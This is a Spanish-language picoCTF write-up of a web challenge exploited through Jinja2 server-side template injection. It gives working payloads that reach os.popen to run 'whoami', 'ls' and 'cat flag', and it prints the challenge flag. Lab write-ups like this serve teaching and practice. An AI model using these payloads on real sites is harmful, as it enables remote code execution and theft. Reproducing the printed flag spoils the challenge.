#### Descripción

¡Hice un sitio web genial donde puedes anunciar lo que quieras! ¡Pruébalo!¡Escuché que las plantillas son una forma genial y modular de crear aplicaciones web! ¡Echa un vistazo a mi sitio web [aquí](http://rescued-float.picoctf.net:64566/)!

### Solución
Ahora, para resolver el desafío, necesitamos encontrar el valor de la bandera que podemos obtener realizando un ataque de inyección de comandos o ejecución remota de código. Podemos buscar las cargas útiles disponibles con respecto a **Jinja2** para ejecutar la inyección de comandos.

Proporcionemos información de la siguiente manera:

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('**whoami**').read() }}

Se confirma que la aplicación es vulnerable al ataque de inyección de comandos y ahora podemos buscar el archivo de bandera usando el comando '**ls**' para enumerar los archivos disponibles en el directorio actual proporcionando entrada como se muestra a continuación:

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('**ls**').read() }}

Afortunadamente, tenemos el archivo de bandera en la misma carpeta, por lo que no tenemos que buscarlo más y podemos leer directamente el contenido del archivo de bandera usando el comando **cat** como se muestra a continuación:

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('**cat flag**').read() }}

### Bandera
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}`